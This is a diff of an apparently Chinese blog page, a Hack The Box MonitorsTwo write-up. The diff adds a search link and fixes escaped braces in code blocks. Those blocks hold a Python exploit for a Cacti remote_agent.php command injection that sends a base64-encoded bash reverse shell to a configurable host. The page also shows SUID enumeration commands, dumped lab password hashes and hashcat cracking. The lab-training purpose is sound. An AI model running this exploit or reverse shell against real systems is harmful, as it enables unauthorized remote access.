@@ -84,6 +84,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -253,7 +255,7 @@ Open result.txt error, open result.txt: permission denied
 <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>
     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> proxy<span class="token operator">=</span>None<span class="token punctuation">,</span> rs_host<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> rs_port<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
         self<span class="token punctuation">.</span>url <span class="token operator">=</span> url
-        self<span class="token punctuation">.</span>session <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>headers<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"User-Agent": self.random_user_agent()&amp;#125;, verify=False, proxies=proxy)</span>
+        self<span class="token punctuation">.</span>session <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>random_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span>
         self<span class="token punctuation">.</span>rs_host <span class="token operator">=</span> rs_host
         self<span class="token punctuation">.</span>rs_port <span class="token operator">=</span> rs_port
 
@@ -262,14 +264,14 @@ Open result.txt error, open result.txt: permission denied
         <span class="token comment" spellcheck="true"># local_cacti_ip  = self.url.split("//")[1].split("/")[0]</span>
         local_cacti_ip <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>
 
-        headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> f<span class="token string">'&amp;#123;local_cacti_ip&amp;#125;'</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+            <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> f<span class="token string">'{local_cacti_ip}'</span>
+        <span class="token punctuation">}</span>
 
-        revshell <span class="token operator">=</span> f<span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/&amp;#123;self.rs_host&amp;#125;/&amp;#123;self.rs_port&amp;#125; &lt;&amp;1'"</span>
+        revshell <span class="token operator">=</span> f<span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/{self.rs_host}/{self.rs_port} &lt;&amp;1'"</span>
         <span class="token keyword">import</span> base64
         b64_revshell <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>revshell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        payload <span class="token operator">=</span> f<span class="token string">";echo &amp;#123;b64_revshell&amp;#125; | base64 -d | bash -"</span>
+        payload <span class="token operator">=</span> f<span class="token string">";echo {b64_revshell} | base64 -d | bash -"</span>
         payload <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
         urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
 
@@ -277,13 +279,13 @@ Open result.txt error, open result.txt: permission denied
         <span class="token keyword">for</span> host_id <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
             <span class="token keyword">for</span> local_data_ids <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                 urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>
-                    f<span class="token string">"&amp;#123;self.url&amp;#125;/remote_agent.php?action=polldata&amp;local_data_ids[]=&amp;#123;local_data_ids&amp;#125;&amp;host_id=&amp;#123;host_id&amp;#125;&amp;poller_id=1&amp;#123;payload&amp;#125;"</span><span class="token punctuation">)</span>
+                    f<span class="token string">"{self.url}/remote_agent.php?action=polldata&amp;local_data_ids[]={local_data_ids}&amp;host_id={host_id}&amp;poller_id=1{payload}"</span><span class="token punctuation">)</span>
 
         <span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">:</span>
             <span class="token keyword">try</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]try: &amp;#123;&amp;#125;"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]try: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                 r <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"&amp;#123;r.status_code&amp;#125; - &amp;#123;r.text&amp;#125;"</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"{r.status_code} - {r.text}"</span><span class="token punctuation">)</span>
             <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                 <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
                 sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -336,7 +338,7 @@ www-data
 <p>这里也没有sudo -l的提权</p>
 <p>用三个查找suid提权方法（任选其一即可）：</p>
 <pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
-<span class="token function">find</span> / -user root -perm -4000 -exec <span class="token function">ls</span> -ldb <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125; \;</span>
+<span class="token function">find</span> / -user root -perm -4000 -exec <span class="token function">ls</span> -ldb <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span>
 <span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null
 </code></pre>
 <p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519095049-pqc3pt7.png" alt="image">​</p>
@@ -359,7 +361,7 @@ wait-for-it db:3306 -t 300 -- <span class="token keyword">echo</span> <span clas
 
 <span class="token function">chown</span> www-data:www-data -R /var/www/html
 <span class="token comment" spellcheck="true"># first arg is `-f` or `--some-option`</span>
-<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"$&amp;#123;1#-&amp;#125;"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">${1#-}</span>"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
         <span class="token keyword">set</span> -- apache2-foreground <span class="token string">"<span class="token variable">$@</span>"</span>
 <span class="token keyword">fi</span>
 
@@ -485,9 +487,9 @@ version
 </code></pre>
 <pre class=" language-bash"><code class="language-bash">mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"select * from user_auth;"</span>
 </code></pre>
-<p>1       admin   10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x40;&#x6d;&#x6f;&#110;&#105;&#x74;&#111;&#114;&#x73;&#x74;&#119;&#x6f;&#46;&#104;&#116;&#98;">&#97;&#100;&#109;&#105;&#110;&#x40;&#x6d;&#x6f;&#110;&#105;&#x74;&#111;&#114;&#x73;&#x74;&#119;&#x6f;&#46;&#104;&#116;&#98;</a></p>
+<p>1       admin   10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#x40;&#109;&#111;&#x6e;&#105;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#98;">&#x61;&#100;&#x6d;&#x69;&#110;&#x40;&#109;&#111;&#x6e;&#105;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#98;</a></p>
 <p>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on</p>
-<p>4       marcus  10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#x6d;&#x61;&#x72;&#x63;&#x75;&#x73;&#x40;&#109;&#x6f;&#110;&#x69;&#x74;&#111;&#114;&#x73;&#116;&#x77;&#111;&#46;&#104;&#x74;&#x62;">&#x6d;&#x61;&#x72;&#x63;&#x75;&#x73;&#x40;&#109;&#x6f;&#110;&#x69;&#x74;&#111;&#114;&#x73;&#116;&#x77;&#111;&#46;&#104;&#x74;&#x62;</a></p>
+<p>4       marcus  10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#109;&#97;&#114;&#x63;&#117;&#115;&#x40;&#x6d;&#x6f;&#110;&#x69;&#116;&#x6f;&#114;&#x73;&#116;&#x77;&#x6f;&#x2e;&#104;&#116;&#x62;">&#109;&#97;&#114;&#x63;&#117;&#115;&#x40;&#x6d;&#x6f;&#110;&#x69;&#116;&#x6f;&#114;&#x73;&#116;&#x77;&#x6f;&#x2e;&#104;&#116;&#x62;</a></p>
 <p>‍</p>
 <pre class=" language-sh"><code class="language-sh">┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
 └─$ sudo hashcat -m 3200 -a 0 password.txt /usr/share/wordlists/rockyou.txt.gz     
@@ -582,6 +584,8 @@ Stopped: Fri May 19 11:11:28 2023
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
       </ul>
     </div>
 
@@ -643,6 +647,8 @@ Stopped: Fri May 19 11:11:28 2023
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
